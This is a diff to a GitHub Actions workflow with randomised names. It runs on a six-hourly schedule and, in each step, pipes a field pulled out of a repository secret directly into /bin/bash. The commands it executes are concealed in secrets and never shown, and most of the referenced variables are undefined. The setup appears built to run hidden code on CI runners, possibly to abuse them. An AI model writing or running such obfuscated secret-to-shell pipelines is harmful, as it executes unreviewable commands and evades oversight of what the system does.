@@ -1,31 +1,30 @@
 name: dingzhengfeng4532
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '13 2/6 * * *'
-
+    - cron: '57 3/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: dingzhengfeng4532
         env:
-          hmvv4782: ${{ secrets.hmvv4782 }}
+          jmg01072: ${{ secrets.jmg01072 }}
         run: |
-          echo $hmvv4782 | jq -r .acmvb906 | /bin/bash
-          echo $u6 | jq -r .fgt5 | /bin/bash
-          echo $vfr9 | jq -r .dful0 | /bin/bash
-          echo $a8004 | jq -r .km25165 | /bin/bash
-          echo $k7 | jq -r .dm64507 | /bin/bash
-          echo $jmi46 | jq -r .vievw86 | /bin/bash
-          echo $c3 | jq -r .rtlr0305 | /bin/bash
-          echo $xvhqy3121 | jq -r .ge501 | /bin/bash
-          echo $v808 | jq -r .shug64973 | /bin/bash
-          echo $oqlm85 | jq -r .bymgb0 | /bin/bash
-          echo $ms19835 | jq -r .iu40299 | /bin/bash
-          echo $gsc660 | jq -r .cuws8 | /bin/bash
-          echo $uq76 | jq -r .aewo5092 | /bin/bash
-          echo $q48039 | jq -r .xlgrn046 | /bin/bash
-          echo $hvusy28116 | jq -r .gmj31425 | /bin/bash
+          echo $jmg01072 | jq -r .ua9335 | /bin/bash
+          echo $wa65 | jq -r .pepk230 | /bin/bash
+          echo $jf9 | jq -r .ri7 | /bin/bash
+          echo $bv294 | jq -r .w06 | /bin/bash
+          echo $cwayr55470 | jq -r .sfs81 | /bin/bash
+          echo $xtzfd77556 | jq -r .vw40217 | /bin/bash
+          echo $rumk58 | jq -r .jekzu1 | /bin/bash
+          echo $lkaae680 | jq -r .krzi27666 | /bin/bash
+          echo $a00 | jq -r .uj1 | /bin/bash
+          echo $en9113 | jq -r .fuj8582 | /bin/bash
+          echo $wqn88217 | jq -r .wgrd364 | /bin/bash
+          echo $n9969 | jq -r .y2233 | /bin/bash
+          echo $hjj4 | jq -r .xj11 | /bin/bash
 
